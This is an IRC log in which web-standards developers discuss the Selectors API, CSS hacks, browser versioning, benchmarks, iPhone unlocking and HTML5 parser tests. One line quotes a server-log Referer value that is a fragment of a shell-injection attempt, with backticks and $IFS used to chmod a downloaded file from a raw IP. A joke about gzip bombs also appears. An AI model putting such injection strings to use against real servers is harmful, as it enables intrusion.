then you could do if (document.isSelectorSupported(sel)) document.querySelector(sel) else { /* implementation in JS */ }

[17:23:02.0000] <Lachy>
have someone send mail to list about it

[17:24:00.0000] <Lachy>
we'd probably get people doing this:

[17:24:01.0000] <Hixie>
it's not really isSelectorSupported() you need

[17:25:00.0000] <Lachy>
document._querySelector = document.querySelector; document.querySelector = function() { /* custom function that does that check automatically */ }

[17:25:01.0000] <Hixie>
it's more isSelectorImplementedWithoutBugsAndWithAcceptablePerformance()

[17:25:02.0000] <Lachy>
:-)

[17:26:00.0000] <Hixie>
my point being, you can't rely on the client to implement the method usefully

[17:26:01.0000] <Hixie>
people will end up doing regexps on the argument anyway

[17:26:02.0000] <Hixie>
to catch the ones they need to support themselves

[17:27:00.0000] <Lachy>
with some sort of browser sniffing technique?

[17:27:01.0000] <Hixie>
i'd guess, yes

[17:28:00.0000] <Lachy>
where they know, for example, the need to always handle foo>bar with custom scripts in IE9, and but let it be handled natively in other browsers ;-)

[17:29:00.0000] <sayrer>
yeah, this is where the generality of the Selector API can be a problem in practice

[17:29:01.0000] <Lachy>
maybe authors would start incorporating CSS filters into querySelector calls

[17:29:02.0000] <sayrer>
getElementsByClassName is dumber, but much easier to check for

[17:30:00.0000] <othermaciej>
I have to try this benchmark to see how our native impl compares to the JS library versions

[17:32:00.0000] <othermaciej>
hmm, only an order of magnitude faster than the fastest JS version

[17:32:01.0000] <othermaciej>
/me is a little disappointed

[17:33:00.0000] <othermaciej>
I bet some common cases (id selectors at least) could be optimized further

[17:34:00.0000] <Lachy>
how does querySelector("#foo"); compare with getElementById("foo");?

[17:35:00.0000] <Lachy>
in regards to performance

[17:36:00.0000] <othermaciej>
it's probably slower

[17:36:01.0000] <othermaciej>
although it could probably be made practically as fast

[17:36:02.0000] <Hixie>
i'd be shocked if it was faster

[17:36:03.0000] <Hixie>
:-P

[17:36:04.0000] <othermaciej>
it doesn't really need to be slower, at least in the common case where the ID is unique

[17:36:05.0000] <tantek_>
/me just saw the reference by Lachy to authors possibly using CSS filters in JS, and shuddered.

[17:38:00.0000] <Lachy>
tantek_, I'm not to happy about it either, but since so many filters are just hacks with selectors, it seems likely

[17:38:01.0000] <tantek_>
Lachy, filters can't be hacks with selectors. filters are based on including or not an entire stylesheet.

[17:40:00.0000] <tantek_>
so unless there's a way to use selectors with @import...

[17:40:01.0000] <Lachy>
tantek_, this list contains many filters that are just using selectors to filter out rules from specific UAs. http://centricle.com/ref/css/filters/

[17:41:00.0000] <Lachy>
like: * html { ... }

[17:41:01.0000] <tantek_>
oh dear - those are not all filters, those are just css hacks, some subset of which are css filters

[17:41:02.0000] <Lachy>
I've never know the term CSS filters to be restricted to just those that import entire stylesheets or not

[17:44:00.0000] <tantek_>
Lachy, I introduced the term filter, in the context of CSS, with this page: http://tantek.com/CSS/Examples/highpass.html

[17:45:00.0000] <Lachy>
IMHO, a filter is just whatever mechanism is used to show or hide specific rules to specific browsers

[17:45:01.0000] <tantek_>
The whole point of CSS filters, rather than just hacks, is as written there: Using the High Pass Filter, both the actual HTML document and the actual CSS style sheet are kept clean and free of any hacks. The only hack in use, for that matter, is neatly contained in the "filter" style sheet.

[17:47:00.0000] <Lachy>
tantek_, this is the terminology I use http://lachy.id.au/log/2006/01/csshack - I break down a hack into 3 components: the limitation, the patch and the filter.

[17:49:00.0000] <tantek_>
yes, clearly the term CSS filter has drifted in the wild from how I first defined it.  I'll collect a to-do item to write up a more thorough definition with distinctions.

[17:51:00.0000] <tantek_>
what you call "filter" in your blog post would be more correctly labeled perhaps the "conditional"

[17:51:01.0000] <othermaciej>
I'm glad I'm not a web developer

[17:52:00.0000] <tantek_>
then using that terminology, a CSS filter uses a conditional to pass an entire style sheet to only a subset of all browsers

[17:52:01.0000] <Lachy>
well, AFAICT, you only defined what "high pass filter" means.  You didn't seem to place much restriction on what else could be a filter

[17:53:00.0000] <othermaciej>
unfortunately what most people need is a low pass filter

[17:53:01.0000] <othermaciej>
and the cutoff has to be above IE6 (possibly above IE7)

[17:53:02.0000] <tantek_>
Lachy see the directory of that URL I provided.

[17:53:03.0000] <tantek_>
e.g. http://tantek.com/CSS/Examples/midpass.html

[17:54:00.0000] <tantek_>
http://tantek.com/CSS/Examples/ie50winbandpass.html

[17:54:01.0000] <tantek_>
http://tantek.com/CSS/Examples/ie55winbandpass.html

[17:54:02.0000] <tantek_>
and finally: http://tantek.com/log/2004/07.html#ie5macbandpass

[17:55:00.0000] <tantek_>
othermaciej, I haven't designed a midpass filter that works for IE5-6 but given the above you probably could.

[17:56:00.0000] <Lachy>
<!--[if IE lte 6]--> works well

[17:56:01.0000] <othermaciej>
seeing hacks like this makes me wonder if maybe Microsoft's versioning thingie might be a good idea

[17:57:00.0000] <tantek_>
Lachy - conditional comments are proprietary and thus I avoid them.

[17:57:01.0000] <Lachy>
othermaciej, it's not a good idea, for many reasons

[17:57:02.0000] <tantek_>
one of the requirements of the CSS hacks I designed is that they are all non-proprietary.  another requirement is that they are all valid CSS.

[17:57:03.0000] <Lachy>
tantek_, I somewhat agree, and I tend to use only a select few hacks that I know will be harmless in the future

[17:57:04.0000] <tantek_>
and a design preference was that they didn't pollute the markup.

[17:58:00.0000] <tantek_>
conditional comments violate all those requirements/preferences.

[17:58:01.0000] <Lachy>
but the advantage of conditional comments is that there slighly more reliable than depending on buggy behaviour in browsers

[17:58:02.0000] <tantek_>
othermaciej - the versioning thingie will only result in more fragile style sheets

[17:58:03.0000] <tantek_>
just as javascript that already do UA string versioning are notoriously fragile.

[17:59:00.0000] <Lachy>
personally, I mostly avoid conditional comments

[17:59:01.0000] <othermaciej>
I guess the bad thing is not that these css hacks exist at all but that so often you have to use them as a bread and butter part of web design, not just for a few crazy edge cases

[18:00:00.0000] <othermaciej>
I do really hate when people use CSS hacks that use correct behavior rather than wrong behavior as the trigger

[18:00:01.0000] <Lachy>
the big problem is that people resort to hacks far too often, instead of just looking for fully conforming alternatives

[18:00:02.0000] <othermaciej>
for example some sites have Opera-specific CSS (often wrong even for Opera) in @media rules

[18:00:03.0000] <tantek_>
btw, as written, the ugliness of hacks is a feature, it's meant to make you want to avoid using them, and to have the impulse to clean them up when looking at them in the future.

[18:00:04.0000] <othermaciej>
which in a few cases broke Safari 3

[18:00:05.0000] <tantek_>
othermaciej, strongly agreed.

[18:01:00.0000] <Lachy>
the ugliness isn't really a deterrent

[18:01:01.0000] <tantek_>
it's not supposed to be a deterrent, it's just supposed to be a reminder that something isn't quite right

[18:01:02.0000] <othermaciej>
so I wish there was a general principle of "don't target a bug workaround with a trigger of correctness"

[18:01:03.0000] <Lachy>
most people aren't perfectionists and end up with messy code with or without hacks

[18:01:04.0000] <othermaciej>
although targetting a bug workaround with another bug as a trigger can also be bad

[18:01:05.0000] <othermaciej>
but at least it mostly sucks for the engine that had the bugs

[18:02:00.0000] <tantek_>
Lachy, it's not a 100% people solution for sure, but as long as at least *some* people see hacks as ugly last resorts and things to be cleaned up, hacks are better than formal methods for solving these sorts of problems.

[18:02:01.0000] <Lachy>
the only bugs that are really safe to depend on are bugs in obsolete versions of browsers that have been fixed in the latest version.  So * html is safe for IE6, since IE7 fixed it

[18:02:02.0000] <tantek_>
othermaciej, precisely, the guilty are punished.

[18:03:00.0000] <Lachy>
tantek_, the guilty browser vendor may be punished, but they just pass their punishment onto the web developers (like MS is doing with X-UA-Compaible)

[18:04:00.0000] <tantek_>
Lachy, I'm not convinced that battle is over yet.

[18:04:01.0000] <Lachy>
do you think there's a chance to get MS to reverse their decision, or at least make it less harmful somehow?

[18:10:00.0000] <tantek_>
I'm hoping/fighting for fixing default behavior

[18:11:00.0000] <Lachy>
I've been fighting for that since I first heard about this decision 9 months ago

[18:38:00.0000] <othermaciej>
I doubt MS will back off

[18:38:01.0000] <othermaciej>
besides dominant (but shrinking) market share, compatibility with existing content (public or not) is their biggest competitive advantage

[18:39:00.0000] <Lachy>
it certainly seems unlikely. The best I think we can hopeful is that his will be the last version requiring an opt-in

[18:39:01.0000] <Lachy>
s/hopeful/hope for/

[18:39:02.0000] <Lachy>
s/that his/that this/

[18:40:00.0000] <Lachy>
/me is really tired. But have stuff to finish before going to bed

[18:40:01.0000] <othermaciej>
when other browser vendors complain about it, they probably feel the same way I do when Microsoft folks say "let's not compete on standards, let's just all agree which ones we will support and not do any more" or Mozilla folks say "let's not compete on performance by posting public benchmark results"

[18:41:00.0000] <Lachy>
benchmark results are useful.  All browsers need to remain fast and not use too much memory

[18:41:01.0000] <Lachy>
Firefox is guilty of being slow and using too much memory

[18:43:00.0000] <othermaciej>
web compatibility (and even intranet compatibility) is also useful

[18:43:01.0000] <othermaciej>
but I think the playing field to compete in that space is less level

[18:44:00.0000] <othermaciej>
web standards and performance metrics are clearly and objectively documented, so even a fairly new entrant to the browser engine market can do pretty well pretty quickly

[18:44:01.0000] <Lachy>
web compatibility is more important than intranet compat though. But I think MS are trying to treat them equally

[19:01:00.0000] <gavins>
othermaciej: which mozilla folks have said that?

[19:02:00.0000] <othermaciej>
gavin_: these were generally private requests from various Mozilla folks to various Apple and non-Apple WebKit contributors, so perhaps it was unfair of me to call it out

[19:04:00.0000] <gavin_>
I think it's more unfair to call them out and then say that they were private requests when asked for evidence :)

[19:04:01.0000] <gavin_>
not that I think you're lying, but I think it may be a bit of a mischaracterization if you try to apply it generally to "Mozilla"

[19:06:00.0000] <gavin_>
it's certainly doesn't reflect the viewpoints I've seen in the mozilla community, anyhow. perhaps I'm being a bit oversensitive :)

[19:10:00.0000] <othermaciej>
gavin_: I feel conflicted because:

[19:10:01.0000] <othermaciej>
a) I would feel bad revealing the contents of private communications

[19:11:00.0000] <othermaciej>
b) I probably shouldn't say things like that and not back it up

[19:11:01.0000] <gavin_>
sure, I understand

[19:11:02.0000] <othermaciej>
c) I'm not sure it's fair to let people make requests like that and not even mention that they did so

[19:12:00.0000] <gavin_>
I think it's probably unfair to mention it without proper context

[19:12:01.0000] <othermaciej>
however some WebKit contributors have avoided posting cross-browser benchmark results publicly as a result of requests along these lines

[19:13:00.0000] <othermaciej>
I'm sure some Mozilla folks (like John Resig say) would not agree with this point of view

[19:13:01.0000] <gavin_>
I mean, it seems like that was your boiled-down takeaway from the message you got

[19:13:02.0000] <gavin_>
but perhaps that wasn't the intent of the message

[19:14:00.0000] <alp>
gavin_: as a non-apple webkit contributor i can confirm what othermaciej is saying. no judgement on whether it's a good policy to keep benchmarks quiet or not, but i've respected their wishes

[19:14:01.0000] <othermaciej>
since he does post benchmark results, sometimes even cross-browser ones

[19:15:00.0000] <gavin_>
I've never heard any mozilla folks say that they browser competition is bad, or that benchmark results should be hidden, so it surprised me, is all

[19:15:01.0000] <gavin_>
now, I've heard  a lot say that you have to be careful with how you interpret benchmarks, and you need to know what you're measuring

[19:16:00.0000] <gavin_>
because there are so many bogus benchmarks out there that don't represent useful metrics

[19:16:01.0000] <gavin_>
but that's a different problem

[19:16:02.0000] <othermaciej>
I've certainly seen a lot of badly designed benchmarks

[19:18:00.0000] <othermaciej>
I think that in any case Apple Marketing will continue to post competitive benchmark results, though on the WebKit blog we've been noting version-to-version improvements more than cross-browser comparisons

[19:18:01.0000] <othermaciej>
I think competition is healthy and I like (reasonably well-deisgned) benchmarks and standards compliance challenges like the acid tests

[19:19:00.0000] <othermaciej>
I should probably blog about it

[19:31:00.0000] <roc>
that all sounds rather odd. if I knew who was responsible, I'd yell at them

[19:35:00.0000] <alp>
the guy who asked for benchmarks to be kept quiet is a mozilla hacker i respect quite much. hope there's no yelling, just constructive discussion

[19:37:00.0000] <othermaciej>
the (totally separate) requests I've personally gotten along these lines were also from people I very much respect

[01:41:00.0000] <Lachy>
Yay! Now new iPhone with version 1.1.3 can be unlocked!  Now I can finally get myself one :-)

[01:46:00.0000] <jgraham_>
Lachy: You're in a channel full of Apple employees. If you go around saying things like that then one day soon you'll get an unexpected knock at the door. When you open it there'll be no one there, and you'll just have time to notice a car you've never seen with a single passenger wearing what appears to be a black polo neck before everything goes dark

[01:47:00.0000] <Lachy>
yeah, well, all the apple employees here can pass my feedback on to management that locking iPhones to specific networks sucks.

[01:48:00.0000] <Lachy>
I'd be willing to pay a higher price for legitimately unlocked phone, but since Apple won't play nice, that's their problem

[01:49:00.0000] <hsivonen>
I find it weird that parts of U.S. press are praising iPhone as loosening the network operator grip on product design when from a Finnish (or Norwegian point of view I suppose) the iPhone looks like the posterchild of American mobile lock-in

[01:49:01.0000] <hsivonen>
Finnish point of view that is

[01:50:00.0000] <jgraham_>
I'm not sure that it really is their problem if you're prepared to buy it anyway

[01:51:00.0000] <Lachy>
jgraham_, Apple loses out on the extra income from the AT&T deal

[01:52:00.0000] <annevk>
jgraham_, agreed

[01:53:00.0000] <jgraham_>
Yeah, but if you buy the phone anyway you're more likely to keep buying iPhones in the future to have access to exactly the same features (some of which, presumably, are patented)

[01:54:00.0000] <Lachy>
jgraham_, that's fine I support all of Apple's good decisions, but I stop short of consenting to bad deals

[01:57:00.0000] <jgraham_>
Well I guess you have to run the risk that at some point in the future your iPhone dies, you want to replace it, and there is no hackable version available. 

[01:58:00.0000] <Lachy>
Weighing up the risk of losing the iPhone and not having it covered by warrenty, compared with not having an iPhone at all?  That's an easy decision

[01:59:00.0000] <hsivonen>
the U.S. really needs stronger telco regulation

[01:59:01.0000] <hsivonen>
for making sure that carriers are reduced to agnostic bit pipes that don't interfere with content choice or product design

[01:59:02.0000] <jgraham_>
hsivonen: But don't you know that regulation hurts competition and is for evil communists!?!</slashdot>

[02:01:00.0000] <hsivonen>
jgraham_: it doesn't take much hanging around with Nokia engineers to figure out that phones would have nicer features if they didn't have to placate to foreign carriers

[02:03:00.0000] <jgraham_>
(as an aside the reason that I don't have an iPod is lack of support for the music formats I care about.)

[02:08:00.0000] <othermaciej>
jgraham: engineering is pretty well separated from black ops at Apple

[02:09:00.0000] <othermaciej>
Lachy: you can pay a higher price to get an unlocked phone from Orange in France, but I dunno if they will ship internationally

[02:09:01.0000] <othermaciej>
(however it is apparently a ludicrously higher price)

[02:10:00.0000] <jgraham_>
hsivonen: Oh and I should say that _I_ agree with you about the regulation, but I think lots of Americans would disagree :)

[02:12:00.0000] <Lachy>
othermaciej, If I got it there, would it work on non-French networks?

[02:13:00.0000] <Lachy>
and I also agree about the ludicrously high price

[02:13:01.0000] <othermaciej>
Lachy: it's unlocked - I assume it would work with any SIM card

[02:13:02.0000] <othermaciej>
(it would have to be a GSM network I guess)

[02:14:00.0000] <Lachy>
someone told me there are different types of unlocking. That while it may be unlocked from a specific network, it can still be locked to a country. But I don't know how reliable that information is

[02:15:00.0000] <Lachy>
I just need to find someone in the USA who'd be willing to buy it and ship it to me as a gift

[02:15:01.0000] <othermaciej>
oh, I wouldn't know

[02:15:02.0000] <Lachy>
that way, I avoid the ludicrous 24% norwegian import tax

[02:15:03.0000] <hsivonen>
othermaciej: IIRC, at least either of the "unlocked" German or French versions were locked to the country

[02:15:04.0000] <hsivonen>
reportedly

[02:15:05.0000] <othermaciej>
I did not know country locking was possible

[02:16:00.0000] <Lachy>
nor did I until I was told that.  I was prepared to pay the higher price to get one there initially, till I heard about the country lock

[02:17:00.0000] <virtuelv>
Lachy: or you can wait until it arrives in france, where locking is illegal

[02:17:01.0000] <Lachy>
virtuelv, read previous comments about country locking

[02:18:00.0000] <virtuelv>
Lachy: yeah

[02:18:01.0000] <virtuelv>
or you could buy a phone that grants freedom 0

[02:18:02.0000] <hsivonen>
(GSM encryption at least used to be illegal in France)

[02:18:03.0000] <virtuelv>
Lachy: for reference http://www.gnu.org/philosophy/free-sw.html

[02:19:00.0000] <hsivonen>
(I don't know if all French-market phones are still defective that way)

[02:20:00.0000] <othermaciej>
there seems to be some controversy over whether it is in fact country locked

[02:21:00.0000] <othermaciej>
according to some sources, French law would not even allow a country lock, but the 1.1.2 firmware was buggy

[02:23:00.0000] <othermaciej>
http://www.ilounge.com/index.php/news/comments/unlocked-iphones-sold-by-orange-not-country-locked/12068

[02:24:00.0000] <othermaciej>
(though I think you need a French mailing address, and of course, redonkulous amounts of extra €

[02:28:00.0000] <Lachy>
the comments on that article suggest otherwise

[02:29:00.0000] <othermaciej>
yeah, there's other articles that claim it is country-locked with commenters asserting the contrary

[02:29:01.0000] <othermaciej>
I wouldn't bet either way

[02:30:00.0000] <Lachy>
I'll play it safe and get a fully locked phone from the US, and then unlock it

[03:04:00.0000] <Philip`>
/me thinks planet.html5.org should redirect to http://www.w3.org/html/planet/

[03:07:00.0000] <annevk>
e-mail me, that should be doable :)

[05:46:00.0000] <Philip`>
#data

[05:46:01.0000] <Philip`>
<b>Test</i>Test

[05:46:02.0000] <Philip`>
#document

[05:46:03.0000] <Philip`>
| <html>

[05:46:04.0000] <Philip`>
|   <head>

[05:46:05.0000] <Philip`>
|   <body>

[05:46:06.0000] <Philip`>
|     <b>

[05:46:07.0000] <Philip`>
|       "TestTest"

[05:46:08.0000] <Philip`>
Hmm, I don't like that

[05:47:00.0000] <Philip`>
and I don't know what should happen with <b>Test<script id=s>s=document.getElementById('s');s.parentNode.removeChild(s)</script>Test

[05:48:00.0000] <Philip`>
(Opera and Safari create two text nodes in both cases; Firefox creates one in the first case, two in the second)

[05:49:00.0000] <Philip`>
and the spec seems too vague to justify that test case

[05:50:00.0000] <jgraham>
Presumably the non-script testcase is well defined in the spec?

[05:51:00.0000] <Philip`>
"When the steps below require the UA to append a character to a node, the UA must collect it and all subsequent consecutive characters that would be appended to that node, and insert one Text node whose data is the concatenation of all those characters."

[05:51:01.0000] <Philip`>
I don't think it's clear whether that means all character tokens that will ever be appended to that node at any point in the future, or whether it's only consecutive character toke

[05:52:00.0000] <Philip`>
...ns

[05:52:01.0000] <Philip`>
Oh, it already says consecutive

[05:52:02.0000] <Philip`>
but it still seems unclear

[07:26:00.0000] <Philip`>
/me now passes enough tests that he really needs to add a counter to tell him how many tests he's passing

[08:33:00.0000] <gsnedders>
<http://developers.slashdot.org/comments.pl?sid=446030&cid=22349930>

[08:42:00.0000] <Philip`>
/me encounters http://canvex.lazyilluminati.com/misc/cgi/issues.cgi/message/%3C0822044E-EA7B-43C4-A3AF-4196B09B580C%40iki.fi%3E

[08:43:00.0000] <Philip`>
Now I can pass all of tests1.dat that doesn't match /<(script|style|table|!|textarea|noframes)|<title></i

[09:14:00.0000] <jgraham>
Sigh

[10:59:00.0000] <kingryan>
/me just noticed that html5 defines rel="contact" in a way that clashes with XFN

[11:11:00.0000] <Hixie>
kingryan: oops. can you send mail about that?

[11:11:01.0000] <kingryan>
already did

[11:11:02.0000] <Hixie>
cool, thanks

[11:13:00.0000] <Dashiva>
Philip`: Are you the philip that sent a message about text nodes?

[11:19:00.0000] <jgraham>
Dashiva: Philip` is the Philip who sent a message about text nodes.

[11:26:00.0000] <Philip`>
Dashiva: I agree with jgraham

[11:27:00.0000] <jgraham>
/me considers that a minor success for the day

[11:29:00.0000] <Philip`>
/me encounters the "Process the token as if the insertion mode was "in body", with the following exception: [...stuff that has a global effect on lots of actions throughout the algorithm and will require quite a few code changes...]" and cries

[11:30:00.0000] <Dashiva>
I figured I'd mention that all of those cases also trigger the node merging thing for text

[11:30:01.0000] <jgraham>
Philip`: Yeah, that bit is fun

[11:30:02.0000] <Dashiva>
I got burned earlier on " </body> </html> " creating three " " nodes inside <body>

[11:32:00.0000] <jgraham>
(iirc html5lib does some magic replacement of the insertElement method with a different table-specific version at that point. That's no help to you of course...)

[11:33:00.0000] <Philip`>
/me has about 1200 lines of code now, and no mutable state at all

[11:35:00.0000] <jgraham>
/me wonders if he would find functional programming as hard as it sounds

[11:36:00.0000] <Philip`>
It's not hard at all - it just takes a little while to get used to the different ways of writing things

[11:37:00.0000] <Philip`>
Oh, except for occasional times when you want to do a simple loop but have to end up with confusing fold_left things instead, and then it's kind of annoyingly hard

[11:37:01.0000] <jgraham>
:)

[11:37:02.0000] <jgraham>
(actually I did try some Erlang once but never more than the simplest of toy examples)

[11:38:00.0000] <Philip`>
OCaml is quite nice since you can still write imperative code and mutable variables when you really want to

[11:44:00.0000] <Dashiva>
I always worry about the implementation efficiency when I don't know what it's going to do

[11:48:00.0000] <Philip`>
OCaml isn't crazy like Haskell (with lazy evaluation and stuff), so it's easy to see what it's going to do :-)

[12:28:00.0000] <jwalden>
/me grumbles at random advocacy in http://lists.whatwg.org/pipermail/whatwg-whatwg.org/2008-February/013881.html

[12:29:00.0000] <jwalden>
and I even agree with the sentiments!

[12:31:00.0000] <Dashiva>
And to an Opera employee no less :)

[12:33:00.0000] <jwalden>
/me grumbles further about being "forced" to enable email delivery for the list to not miss stuff on it

[12:42:00.0000] <jwalden>
I have a feeling I'm going to have more hacking to do on postMessage in the very near future :-\

[12:44:00.0000] <jwalden>
/me wonders how he's going to respond to a message he never received without destroying threading

[12:48:00.0000] <Hixie>
Philip`: the <table> disaster sentence isn't as bad as it sounds

[12:49:00.0000] <Hixie>
Philip`: iirc i implemented it in about 5 lines of code -- i just made the function that implements the appending of nodes be a function pointer and swapped in the new function at the right time, or something

[12:55:00.0000] <jwalden>
could someone forward <http://lists.whatwg.org/pipermail/whatwg-whatwg.org/2008-February/013886.html> to me as an attachment, so I can (hopefully) not break threading when I add my thoughts to the thread?  email is jwalden+whatwg⊙me

[12:56:00.0000] <Lachy>
jwalden, download the mbox file http://lists.whatwg.org/pipermail/whatwg-whatwg.org/

[12:56:01.0000] <jwalden>
ooh

[12:56:02.0000] <jwalden>
Lachy++

[12:56:03.0000] <jwalden>
/me learns something new every day!

[12:56:04.0000] <jwalden>
or rather, re-remembers

[13:01:00.0000] <jgraham>
/me wonders if it is obvious that the detail in his email about a simple sign error was as much to convince himself as anything else (though he may still have got it wrong regardless)

[13:21:00.0000] <hsivonen>
“The sadest thing about "HTML 5" is that it will be impossible to create 

[13:21:01.0000] <hsivonen>
an April fool's joke about HTML this year - they've already done that.” – Jukka K. Korpela in ciwah

[13:22:00.0000] <Dashiva>
He's talking about XHTML2 using the XHTML1 namespace? ;)

[13:23:00.0000] <Philip`>
Hixie: I don't have function pointers :-p

[13:23:01.0000] <hsivonen>
http://groups.google.com/group/comp.infosystems.www.authoring.html/msg/58f3108d5a1b8208

[13:23:02.0000] <Hixie>
Philip`: sucks to be you :-P

[13:24:00.0000] <hsivonen>
I expect ciwah to stay with HTML 4.01 for a long time even after HTML5 is a REC

[13:24:01.0000] <Philip`>
/me wonders if the foster parent element can change during execution of that step

[13:24:02.0000] <Hixie>
Philip`: the language i used has only function pointers, it doesn't have any other way of referring to functions :-)

[13:29:00.0000] <SadEagle>
Philip`: weren't you using o'caml? (a * b -> c) ref, no?

[13:31:00.0000] <SadEagle>
Dashiva: wha? XHTML2 uses the XHTML1 namespace? I guess it's good for my blood pressure that I didn't pay any attention to it..

[13:31:01.0000] <gsnedders>
SadEagle: that's the agreement within the XHTML2 WG, though there's been no WD published yet reflecting it

[13:31:02.0000] <Philip`>
SadEagle: I'm using OCaml purely functionally, so no refs

[13:32:00.0000] <Philip`>
(because I want to be able to reuse partially-used parser, rather than having to create a new one for every document)

[13:32:01.0000] <Philip`>
s/parser/parsers/

[13:33:00.0000] <Philip`>
The annoying bit is just trying to find all the places where elements might get inserted in a way that might be affected

[13:34:00.0000] <Philip`>
and that bit probably isn't hard anyway but I can't concentrate now so it's easier just to complain on IRC about it

[13:56:00.0000] <jwalden>
/me finally unmunges mailman's downloadable mboxes enough to get them to work in Thunderbird and when transferred to IMAP

[13:56:01.0000] <jwalden>
stupid spammers

[13:57:00.0000] <jwalden>
stupid mailman hackers who think a spammer couldn't trivially write the regexes I wrote

[13:59:00.0000] <Philip`>
jwalden: If you click the email link at the top of http://lists.whatwg.org/pipermail/whatwg-whatwg.org/2008-February/013886.html then it looks like it'll set the In-Reply-To header correctly

[13:59:01.0000] <jwalden>
sigh

[13:59:02.0000] <gsnedders>
jwalden: spammers are lazy.

[14:00:00.0000] <jwalden>
mailman is common; I very much doubt none have done what I did

[14:00:01.0000] <jwalden>
there's big win to doing it

[14:00:02.0000] <jwalden>
it's a very common output format

[14:06:00.0000] <Philip`>
http://james.html5.org/cgi-bin/parsetree/parsetree.py?uri=http%3A%2F%2Fphilip.html5.org%2Fmisc%2Fstyle-in-table.html

[14:06:01.0000] <Philip`>
Shouldn't the <style> be outside the <table>?

[14:07:00.0000] <Philip`>
(http://parsetree.validator.nu/?doc=http%3A%2F%2Fphilip.html5.org%2Fmisc%2Fstyle-in-table.html&submit=Print+Tree agrees with html5lib)

[14:49:00.0000] <aroben>
Hixie: do you have any data re: the proportion of web servers that only support HTTP/1.0?

[14:49:01.0000] <Hixie>
no

[14:49:02.0000] <aroben>
Hixie: ok, thanks

[14:49:03.0000] <Hixie>
netcraft might

[14:49:04.0000] <aroben>
/me looks


2008-02-09
[20:43:00.0000] <Hixie>
firefox is the only browser with any DOM storage support?

[20:44:00.0000] <othermaciej>
I think that's the case

[20:44:01.0000] <Hixie>
k

[20:45:00.0000] <Hixie>
just making sure i set the right flags on my checkin

[20:47:00.0000] <othermaciej>
are you updating the spec?

[20:47:01.0000] <othermaciej>
it's definitely something we're interested in for WebKit

[20:47:02.0000] <roc>
really? I thought SQL obsoleted it

[20:48:00.0000] <Hixie>
othermaciej: yep

[20:48:01.0000] <Hixie>
roc: people have (strongly) argued that there is room for a simple string key/value synchronous api and an asynchronous structured api

[20:49:00.0000] <othermaciej>
roc: mostly, but I think a simple API for basic key/value storage is still worthwhile

[20:49:01.0000] <roc>
ok

[00:52:00.0000] <hsivonen>
http://www.w3.org/blog/systeam/2008/02/08/w3c_s_excessive_dtd_traffic

[00:52:01.0000] <Hixie>
yet another reason not to put anything in the doctype...

[00:58:00.0000] <jruderman>
bonus points if you can find a real-world program that given <!DOCTYPE html> tries to request a DTD from ""

[00:58:01.0000] <Hixie>
i think the w3c should just make those DTD URIs return infinite streams of bytes

[00:58:02.0000] <Hixie>
or return constructed gzipped content that unzips to gigantic files

[00:58:03.0000] <jruderman>
i liked the idea on slashdot to delay the response

[01:00:00.0000] <Hixie>
or that

[01:39:00.0000] <annevk>
a great, people resolved the header naming problems :)

[01:44:00.0000] <annevk>
maybe I should wait some more and then the spec is suddenly done

[01:55:00.0000] <hsivonen>
the Slashdot comments on the DTD thing are sad as usual

[01:59:00.0000] <annevk>
someone pointed out in e-mail that HTML 5 is the fourth major revision of HTML and not the fifth

[02:00:00.0000] <jruderman>
why, because it's not a "revision" until version 2?

[02:00:01.0000] <annevk>
if you don't count XHTML 1.x it seems he's right, should we change abstract text here and there?

[02:00:02.0000] <annevk>
that's his reasoning, yes

[02:00:03.0000] <annevk>
arguably CSS 2.1 follows that reasoning

[02:00:04.0000] <jruderman>
how about saying it's "a major revision"?

[02:25:00.0000] <hsivonen>
it's interesting that these questions aren't in the Systeam list of questions: 1) Are DTDs a bad idea and should we get rid of them? and 2) Is using URIs as identifiers that aren't meant to be dereferenced a bad idea and should we stop using them that way?

[03:18:00.0000] <gsnedders>
annevk: I'd argue the IIIR draft was the first major

[03:39:00.0000] <jgraham>
/me thinks arguing about whether the first version of something counts as a revision is just as pointless as he arguments about whether the "new millennium" started in 2000 or 2001

[03:39:01.0000] <jruderman>
hehe

[03:42:00.0000] <annevk>
to be clear, I'm just wondering how to reply to such a question

[03:42:01.0000] <annevk>
aesthetically "fifth" sounds better, but other than that I've no opinion on this

[03:43:00.0000] <gsnedders>
jgraham: 2001, kthxbai

[03:47:00.0000] <jruderman>
annevk: reword the thing so you're not forced to say that it's the "fourth" or "fifth" revision

[03:47:01.0000] <jruderman>
call it "a major revision" or "the fifth major version"

[03:53:00.0000] <annevk>
the latter would not be ok :)

[03:53:01.0000] <annevk>
I guess I'll just follow whatever Hixie does

[03:58:00.0000] <gsnedders>
<http://www.onenaught.com/posts/52/ie8-meta-switch-ie7> — heh: "Ian Hixie"

[04:04:00.0000] <jruderman>
hah

[04:05:00.0000] <hsivonen>
gsnedders: that's actually pretty common

[04:05:01.0000] <gsnedders>
hsivonen: googling just mostly showed up his email address, so I can't really tell

[06:35:00.0000] <Philip`>
/me sees requests with Referer set to `62.101.193.244/lupii;chmod$IFS+x$IFS`echo$IFS\ and to XXXX:++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

[06:36:00.0000] <annevk>
yeah, Referer is wrong quite often already...

[06:36:01.0000] <Philip`>
and one set to  HTTP/1.1 (with a space at the start)

[06:37:00.0000] <Philip`>
Oh, and some spammy ones like >Link</a> &gt;sterling silver jewelry&lt;/a&gt;<br>&lt;a href= <a href=\

[06:38:00.0000] <Philip`>
I'm slightly surprised that so few are invalid, though

[06:43:00.0000] <hsivonen>
Hixie: regarding conference-speaking standardista buy-in and the top errors I identified in Alexa top 500:

[06:43:01.0000] <hsivonen>
Hixie: I ran the Happy Cog portfolio front pages through Validator.nu and the errors are pretty much the top errors from Alexa 500

[06:43:02.0000] <hsivonen>
Hixie: http://hsivonen.iki.fi/test/moz/happycog-portfolio-results.txt

[06:44:00.0000] <hsivonen>
(The Happy Cog portfolio represents actual well-known standardista output here.)

[06:46:00.0000] <Philip`>
Presumably those sites were modified by their own developers after the initial design, so it seems hard to tell when the errors were introduced

[06:46:01.0000] <hsivonen>
Philip`: sure, that's likely, but Zeldman's company keeps them in their portfolio, so this should be as good as it gets in the real world

[06:48:00.0000] <annevk>
I don't agree with that

[06:49:00.0000] <hsivonen>
annevk: which part you don't agree with?

[06:49:01.0000] <annevk>
The state of the Web ten years ago wasn't what it is now. Change is certainly pssobile

[06:49:02.0000] <annevk>
possible, even

[06:50:00.0000] <annevk>
though some of those errors should not be errors, agreed, _blank

[06:50:01.0000] <hsivonen>
annevk: sure, change is possible. I'm just arguing that people shouldn't have to focus their effort on benign "errors"

[06:51:00.0000] <annevk>
seems that for Zeldman there's nothing else left :)

